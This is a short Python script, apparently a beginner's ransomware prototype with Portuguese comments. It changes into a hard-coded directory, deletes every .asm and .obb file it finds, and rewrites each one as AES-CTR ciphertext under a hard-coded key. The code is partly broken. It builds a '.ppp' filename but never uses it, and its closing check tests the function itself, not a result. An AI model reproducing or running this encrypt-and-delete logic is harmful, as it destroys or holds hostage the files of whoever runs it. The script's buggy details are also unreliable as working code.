import os, glob, time, pyaes
from pathlib import Path

lst_arq = ["*.asm", "*.obb"]

print('Criptografando...')
time.sleep(1)

try:
	desktop = Path.home() / "/home/luiz/teste/"
#	download = Path.home() / "Downloads"
except Exception:
	pass

os.chdir(desktop)

def criptografando():
	for files in lst_arq:
		for format_file in glob.glob(files):

			print(format_file)
			f = open(f'{desktop}/{format_file}', 'rb')
			file_data = f.read()
			f.close()

			os.remove(f'{desktop}/{format_file}')
			key = b"1ab2c3e4f5goh7i8" # 16 bytes key - chave
			aes = pyaes.AESModeOfOperationCTR(key)
			crypto_data = aes.encrypt(file_data)

			# salvando arquivo novo

			new_file = format_file + ".ppp"
			new_file = open(f'{desktop}/{format_file}', 'wb')
			new_file.write(crypto_data)
			new_file.close()


if __name__ == '__main__':
	criptografando()
	if criptografando:
		print('encriptado')
